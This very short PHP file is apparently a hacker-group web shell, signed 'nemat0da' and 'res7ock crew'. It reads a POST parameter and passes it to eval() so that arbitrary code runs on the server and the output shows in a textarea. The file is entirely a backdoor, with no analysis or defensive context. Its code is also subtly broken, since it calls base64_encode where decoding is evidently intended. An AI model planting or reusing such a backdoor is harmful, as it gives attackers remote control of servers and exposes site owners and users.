
<?php
#nemat0da
#res7ock crew
$md=$_POST['res7ock'];
if (isset($_POST['en'])){
	echo"<textarea  cols='50' rows='12'>";
	eval(base64_encode($md));
	echo"</textarea>";
}

?>